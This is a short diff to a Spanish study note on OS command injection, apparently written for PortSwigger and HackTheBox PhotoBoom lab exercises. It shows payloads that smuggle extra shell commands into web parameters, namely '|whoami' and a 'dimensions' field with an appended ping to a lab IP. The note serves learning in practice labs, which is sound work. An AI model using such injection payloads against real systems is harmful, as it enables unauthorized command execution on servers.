@@ -10,6 +10,13 @@ productId=1&storeId=1|whoami
 
 ```
 
+Otra forma de inyectar comandos HTB PhotoBoom
+
+```
+photo=tabitha-turner-8hg0xRg5QIs-unsplash.jpg&filetype=jpg&dimensions=1000x1500;ping -c 1 10.10.14.34;
+
+```
+
 # Blind OS command injection with time delays
 
 En este caso se inyectan comandos en Submmit feedback se usa de nueva cuenta el pipe |
